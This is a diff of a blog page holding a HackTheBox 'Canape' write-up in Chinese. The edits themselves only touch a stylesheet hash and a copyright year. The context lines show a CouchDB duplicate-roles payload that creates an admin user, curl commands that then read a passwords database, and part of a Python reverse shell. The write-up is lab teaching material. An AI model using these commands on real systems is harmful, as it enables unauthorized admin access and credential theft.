@@ -29,7 +29,7 @@
   <title>[HackTheBox]Canape - Writeup - Naivekun&#39;s blog</title>
   
   
-  <link rel="stylesheet" href="https://naivekun.com/css/style.min.7dc20efbc53647d41aa9ddea0c48e59300223d084e66ea0cbe7c30bd88903acc.css">
+  <link rel="stylesheet" href="https://naivekun.com/css/style.min.c4bc7071f132c964c2116bca53b392933f377e5ca7b7051ed245187c621a2d3e.css">
   
   <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/9.15.10/styles/github.min.css" async>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css" async>
@@ -477,7 +477,7 @@ Google一下，发现
 <pre><code>cu_url_payload = url + &quot;/_users/org.couchdb.user:&quot; + user
 cu_data_payload = '{&quot;type&quot;: &quot;user&quot;, &quot;name&quot;: &quot;'+user+'&quot;, &quot;roles&quot;: [&quot;_admin&quot;], &quot;roles&quot;: [], &quot;password&quot;: &quot;'+password+'&quot;}'
 </code></pre>
-<p>那么直接在shell上<code>curl -X PUT http://127.0.0.1:5984/_users/org.couchdb.user:naivekun --data-binary '{&quot;type&quot;: &quot;user&quot;, &quot;name&quot;: &quot;naivekun&quot;, &quot;roles&quot;: [&quot;_admin&quot;], &quot;roles&quot;: [], &quot;password&quot;: &quot;toosimple&quot;}'</code>
+<p>那么直接在shell上<code>curl -X PUT http://127.0.0.1:5984/_users/org.couchdb.user:naivekun --data-binary '{&quot;type&quot;: &quot;user&quot;, &quot;name&quot;: &quot;naivekun&quot;, &quot;roles&quot;: [&quot;_admin&quot;], &quot;roles&quot;: [], &quot;password&quot;: &quot;toosimple&quot;}'</code> 
 得到<code>{&quot;ok&quot;:true,&quot;id&quot;:&quot;org.couchdb.user:naivekun&quot;,&quot;rev&quot;:&quot;1-30aeb89aab73ae979c754bce5f397599&quot;}</code>
 之后通过http访问passwords
 <code>curl -X GET http://127.0.0.1:5984/passwords -u naivekun:toosimple</code>
@@ -636,7 +636,7 @@ os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);' 
 </ul>
   <div class="copyright">
     &copy;&nbsp;2018  -
-    2021
+    2023
     <div class="publishby">
         Theme by naivekun base on<a href="https://github.com/xiaoheiAh/hugo-theme-pure" target="_blank"> pure</a>.
     </div>
